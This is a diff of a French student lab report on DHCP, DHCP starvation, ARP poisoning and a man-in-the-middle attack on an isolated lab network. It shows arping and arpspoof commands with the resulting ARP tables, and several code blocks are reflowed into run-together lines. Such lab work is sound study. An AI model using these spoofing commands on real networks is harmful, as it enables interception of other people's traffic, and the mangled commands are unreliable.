@@ -228,7 +228,7 @@ interface=enp0s3
 dhcp-range=10.1.1.210,10.1.1.250,12h
 ```
 
-### 🌞 Test!
+### 🌞 Test
 
 ```bash
 ○ dnsmasq.service - DNS caching server.
@@ -255,7 +255,7 @@ Jan 06 11:47:13 dhcp.tp1.efrei systemd[1]: Stopped dnsmasq.service - DNS caching
 
 ## 2. BONUS : DHCP starvation
 
-### 🌞 Proof!
+### 🌞 Proof
 
 ```bash
 Jan 06 17:37:37 dhcp.tp1.efrei dnsmasq-dhcp[847]: DHCPDISCOVER(enp0s3) de:ad:15:2a:5a:13 no address available
@@ -268,15 +268,69 @@ Jan 06 17:37:40 dhcp.tp1.efrei dnsmasq-dhcp[847]: DHCPDISCOVER(enp0s3) de:ad:17:
 Jan 06 17:37:40 dhcp.tp1.efrei dnsmasq-dhcp[847]: DHCPDISCOVER(enp0s3) de:ad:26:25:e5:63 no address available
 ```
 
-## 3. ARP poisoning
+## **3. ARP poisoning**
 
-### 🌞 Proof !
+Node 1 :
 
 ```bash
-VPCS> arp
+VPCS> arp 00:50:79:66:68:01 10.1.1.2 expires in 112 seconds 00:50:79:66:68:02
+10.1.1.3 expires in 116 seconds
+```
 
-00:50:79:66:68:01  10.1.1.2 expires in 112 seconds
-00:50:79:66:68:02  10.1.1.3 expires in 116 seconds
+Attaque :
+
+```bash
+miche@kali:~$ sudo arping -I enp0s9 -S 10.1.1.3 -s SA:LU:UT:ME:OO:OW -c 5 -U
+10.1.1.1
+```
+
+Après attaque :
+
+```bash
+VPCS> arp 00:50:79:66:68:01 10.1.1.2 expires in 86 seconds de:ad:be:ef:ca:fe
+10.1.1.3 expires in 118 seconds
+```
+
+## **B. MITM**
+
+machine attaque :
+
+```bash
+miche@kali:~$ sudo arpspoof -i enp0s9 -t 10.1.1.1 10.1.1.1 miche@kali:~$ sudo
+arpspoof -i enp0s9 -t 10.1.1.1 10.1.1.2
+```
+
+Si on essaye de ping ça timeout donc il faut ajouter :
+
+```bash
+miche@kali:~$ sudo sysctl -w net.ipv4.ip_forward=1 net.ipv4.ip_forward = 1
+```
+
+Sur node1 :
+
+```bash
+VPCS> arp 08:00:27:22:9a:94 10.1.1.2 expires in 120 seconds
+```
+
+Sur node2 :
+
+```bash
+VPCS> arp 08:00:27:22:9a:94 10.1.1.35 expires in 118 seconds 08:00:27:22:9a:94
+10.1.1.1 expires in 119 seconds
+```
+
+Sur la machine attaquante :
+
+```bash
+4: enp0s9:
+<BROADCAST,MULTICAST,UP,LOWER_UP>
+  mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether
+  08:00:27:22:9a:94 brd ff:ff:ff:ff:ff:ff altname enx080027229a94 inet
+  10.1.1.35/24 brd 10.1.1.255 scope global enp0s9 valid_lft forever
+  preferred_lft forever inet6 fe80::a00:27ff:fe22:9a94/64 scope link proto
+  kernel_ll valid_lft forever preferred_lft
+  forever</BROADCAST,MULTICAST,UP,LOWER_UP
+>
 ```
 
 ### 📁 p4_arp_poisoning.pcap
